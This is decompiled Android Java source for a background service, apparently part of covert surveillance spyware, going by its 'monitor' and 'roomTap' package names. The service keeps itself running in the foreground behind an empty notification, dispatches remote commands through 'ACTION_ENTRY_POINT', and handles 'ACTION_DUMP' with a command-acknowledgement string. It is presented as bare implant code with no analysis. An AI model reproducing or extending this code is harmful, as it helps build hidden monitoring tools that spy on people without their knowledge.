package com.network.android.android.monitor;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import com.network.android.c.a.a;
import com.network.android.monitor.a.c;
import com.network.android.roomTap.k;
import com.network.e.a.b;
import com.network.media.f;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public final class NetworkManagerService extends Service {

    /* renamed from: a  reason: collision with root package name */
    private static final Class[] f67a = {Boolean.TYPE};
    private static final Class[] b = {Integer.TYPE, Notification.class};
    private static final Class[] c = {Boolean.TYPE};
    private NotificationManager d;
    private Method e;
    private Method f;
    private Method g;
    private Object[] h = new Object[1];
    private Object[] i = new Object[2];
    private Object[] j = new Object[1];
    private int k = 1977;

    private void a() {
        try {
            this.f.invoke(this, this.i);
        } catch (InvocationTargetException e2) {
            a.a("Unable to invoke method", e2);
        } catch (IllegalAccessException e3) {
            a.a("Unable to invoke method", e3);
        }
    }

    public static void a(Context context, Intent intent, c cVar) {
        a.a("NetworkManagerService start");
        Intent intent2 = new Intent(context, NetworkManagerService.class);
        Bundle extras = intent.getExtras();
        if (extras != null) {
            intent2.putExtras(extras);
        }
        intent2.putExtra("object.hashcode", cVar.hashCode());
        context.startService(intent2);
        a.a("NetworkManagerService start ended");
    }

    /* access modifiers changed from: protected */
    @Override // java.lang.Object
    public final void finalize() {
        super.finalize();
        a.a("NetworkManagerService finalize");
    }

    public final IBinder onBind(Intent intent) {
        return null;
    }

    public final void onCreate() {
        super.onCreate();
        a.a("NetworkManagerService onCreate");
        this.d = (NotificationManager) getSystemService("notification");
        try {
            this.f = getClass().getMethod("startForeground", b);
            this.g = getClass().getMethod("stopForeground", c);
            try {
                this.e = getClass().getMethod("setForeground", f67a);
            } catch (NoSuchMethodException e2) {
                throw new IllegalStateException("OS doesn't have Service.startForeground OR Service.setForeground!");
            }
        } catch (NoSuchMethodException e3) {
            this.g = null;
            this.f = null;
        }
        Notification notification = new Notification();
        int i2 = this.k;
        if (this.f != null) {
            this.i[0] = Integer.valueOf(i2);
            this.i[1] = notification;
            Method method = this.f;
            Object[] objArr = this.i;
            a();
            return;
        }
        this.h[0] = Boolean.TRUE;
        Method method2 = this.e;
        Object[] objArr2 = this.h;
        a();
        this.d.notify(i2, notification);
    }

    public final void onDestroy() {
        super.onDestroy();
        a.a("NetworkManagerService finalize");
        k.a();
        stopForeground(true);
    }

    public final int onStartCommand(Intent intent, int i2, int i3) {
        super.onStartCommand(intent, i2, i3);
        a.a("NetworkManagerService onStartCommand");
        super.onStart(intent, i3);
        a.a("NetworkManagerService onStartFor: " + intent.getAction());
        if (intent.getAction() == null) {
            return 2;
        }
        if (intent.getAction().equals("ACTION_ENTRY_POINT")) {
            try {
                com.network.e.a.a aVar = new com.network.e.a.a(this, this, intent);
                Bundle extras = intent.getExtras();
                Object obj = extras != null ? extras.get("object.hashcode") : null;
                b c2 = ((AndroidMonitorApplication) getApplication()).c();
                if (obj != null) {
                    c2.a((Integer) obj).a(aVar);
                    a.a("NetworkManagerService watcher.service: " + intent.getAction());
                } else {
                    c2.a(aVar);
                }
                a.a("NetworkManagerService onStart end");
                return 2;
            } catch (Exception e2) {
                a.a("NetworkManagerService fail", e2);
                return 2;
            }
        } else if (!intent.getAction().equals("ACTION_DUMP")) {
            return 2;
        } else {
            String stringExtra = intent.getStringExtra("commandAck");
            a.a("NetworkManagerService onStartFor dump commandAck: " + stringExtra);
            f.b(stringExtra);
            return 2;
        }
    }
}
